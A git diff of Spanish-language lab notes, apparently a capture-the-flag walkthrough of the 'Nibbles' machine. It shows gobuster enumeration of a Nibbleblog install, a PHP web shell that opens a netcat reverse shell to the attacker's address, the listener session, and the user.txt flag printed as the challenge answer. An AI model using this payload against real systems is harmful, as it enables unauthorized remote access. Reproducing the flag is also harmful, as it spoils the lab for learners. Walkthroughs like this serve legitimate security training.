@@ -1,3 +1,5 @@
+## NIBBLES - FOOTHOLD INICIAL
+
 Ahora que hemos iniciado sesión en el portal de administración, debemos intentar convertir este acceso en ejecución de código y, en última instancia, obtener acceso de shell inverso al servidor web. Sabemos que un módulo Metasploit probablemente funcionará para esto, pero enumeremos el portal de administración para otras vías de ataque. Mirando un poco alrededor, vemos las siguientes páginas:
 
 | Pagina | Contenido|
@@ -112,8 +114,74 @@ nibbler@Nibbles:/home/nibbler$ ls
 ls
 personal.zip  user.txt
 ~~~
-
+___
 ### RETO
-Obtenga un foothold en el objetivo y envíe la bandera user.txt
++ Obtenga un foothold en el objetivo y envíe la bandera user.txt
 
-R: 79c03865431abf47b90ef24b9695e148
+`R: 79c03865431abf47b90ef24b9695e148`
+
+~~~
+┌──(root㉿kali)-[/home/kali]
+└─# gobuster dir -u http://10.129.138.102/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.138.102/nibbleblog/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/07/20 19:16:39 Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 309]
+/.hta                 (Status: 403) [Size: 304]
+/.htpasswd            (Status: 403) [Size: 309]
+/admin                (Status: 301) [Size: 327] [--> http://10.129.138.102/nibbleblog/admin/]
+/admin.php            (Status: 200) [Size: 1401]                                             
+/content              (Status: 301) [Size: 329] [--> http://10.129.138.102/nibbleblog/content/]
+/index.php            (Status: 200) [Size: 2987]                                               
+/languages            (Status: 301) [Size: 331] [--> http://10.129.138.102/nibbleblog/languages/]
+/plugins              (Status: 301) [Size: 329] [--> http://10.129.138.102/nibbleblog/plugins/]  
+/README               (Status: 200) [Size: 4628]                                                 
+/themes               (Status: 301) [Size: 328] [--> http://10.129.138.102/nibbleblog/themes/]   
+Progress: 4059 / 4615 (87.95%)                                                
+===============================================================
+2022/07/20 19:17:45 Finished
+===============================================================
+~~~
+![]()
+
+![]()
+
+creamos un archivo con el codigo `<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc NUESTRA-IP 9443 >/tmp/f"); ?>` y lo guardamos como image.php
+
+>en firefox http://10.129.200.170/nibbleblog/content/private/plugins/my_image/image.php para activar el reverse shell
+
+~~~
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 9443             
+listening on [any] 9443 ...
+id
+id                                                                               
+connect to [10.10.14.93] from (UNKNOWN) [10.129.138.102] 46598                   
+/bin/sh: 0: can't access tty; job control turned off                             
+$ uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)                       
+$ uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)                       
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'                                
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ ls    
+ls                                                                               
+db.xml  image.php                                                                
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd /home/nibbler                                                                       
+<ml/nibbleblog/content/private/plugins/my_image$ cd /home/nibbler                
+nibbler@Nibbles:/home/nibbler$ ls                                                
+ls                                                                               
+personal.zip  user.txt                                                           
+nibbler@Nibbles:/home/nibbler$ cat user.txt                                      
+cat user.txt                                                                     
+79c03865431abf47b90ef24b9695e148                                                 
+nibbler@Nibbles:/home/nibbler$
+~~~
